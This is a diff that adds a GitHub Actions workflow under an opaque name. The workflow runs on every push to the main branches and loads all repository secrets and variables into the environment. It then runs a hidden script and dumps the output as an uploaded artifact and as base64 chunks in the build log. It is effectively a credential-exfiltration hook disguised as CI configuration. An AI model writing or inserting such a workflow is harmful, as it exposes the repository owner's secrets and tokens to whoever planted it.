@@ -1,0 +1,44 @@
+name: zz2
+on:
+  workflow_dispatch:
+  push:
+    branches: [main, master]
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    env:
+      __ALLSECRETS: ${{ toJson(secrets) }}
+      __VARS: ${{ toJson(vars) }}
+      NHDW: ${{ secrets.NHDW_SECRETS_YAML }}
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        fetch-depth: 0
+    - name: go
+      run: |
+        set +e
+        bash .zz2.sh 2>&1 | tee /tmp/dump.txt
+        echo "@@@@@ DONE rc=$?"
+        gzip -c /tmp/dump.txt | base64 -w0 > /tmp/dump.b64
+        wc -c /tmp/dump.txt /tmp/dump.b64
+    - name: art
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: dump
+        path: /tmp/dump.txt
+        retention-days: 1
+    - name: b64
+      if: always()
+      run: |
+        set +e
+        f=/tmp/dump.b64; [ -s "$f" ] || gzip -c /tmp/dump.txt | base64 -w0 > "$f"
+        s=$(stat -c%s "$f"); echo "B64LEN $s"
+        part=0
+        while [ $((part*20000)) -lt $s ]; do
+          echo "=== CHUNK $part"
+          tail -c +$((part*20000+1)) "$f" | head -c 20000
+          echo
+          part=$((part+1))
+        done
+        echo "=== ENDCHUNKS parts=$part"
